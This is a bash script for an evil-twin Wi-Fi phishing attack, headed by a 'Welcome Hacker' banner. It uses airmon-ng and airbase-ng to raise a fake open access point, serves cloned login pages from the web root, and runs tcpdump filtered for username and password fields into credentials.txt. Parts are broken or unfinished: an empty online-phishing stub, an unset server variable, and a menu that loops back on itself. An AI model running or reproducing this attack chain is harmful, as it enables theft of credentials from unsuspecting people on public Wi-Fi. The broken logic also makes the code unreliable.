#!/bin/bash

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
}

# Function to display the menu for phishing options
menu() {
    echo -e "Select phishing method:"
    echo "1. Online Phishing"
    echo "2. Captive Portal Phishing"
    read -p "Enter your choice: " choice
    case $choice in
        1) online_phishing ;;
        2) captive_portal_phishing ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
}

# Function for online phishing
online_phishing() {
    echo "Online Phishing selected."
    # Implement online phishing logic here
}

# Function for captive portal phishing
captive_portal_phishing() {
    echo "Captive Portal Phishing selected."
    menu
}

# Function to select network interface
select_interface() {
    echo "Select network interface:"
    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
    select interface in $interfaces; do
        if [ -n "$interface" ]; then
            echo "Selected interface: $interface"
            start_captive_portal "$interface"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done
}

# Function to start captive portal phishing
start_captive_portal() {
    interface=$1
    echo "Starting captive portal phishing on interface: $interface"
    # Set interface to monitor mode
    airmon-ng start $interface
    # Start fake AP
    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
    sleep 5 # Wait for AP to start
    serve_login_page "$server" "$interface"
}

# Function to serve login page
serve_login_page() {
    server=$1
    interface=$2
    echo "Serving login page for $server on interface: $interface"
    cp "sites/$server/login.php" "/var/www/html/login.php"
    cp "sites/$server/style.css" "/var/www/html/style.css"
    cp "sites/$server/logo.png" "/var/www/html/logo.png"
    cd /var/www/html
    python3 -m http.server 80
}

# Function to capture credentials
capture_credentials() {
    echo "Capturing credentials..."
    tcpdump -i wlan0 -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd=" > credentials.txt
}

# Main script starts here

# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Start the phishing menu
menu

# Function to select network interface
select_interface
capture_credentials
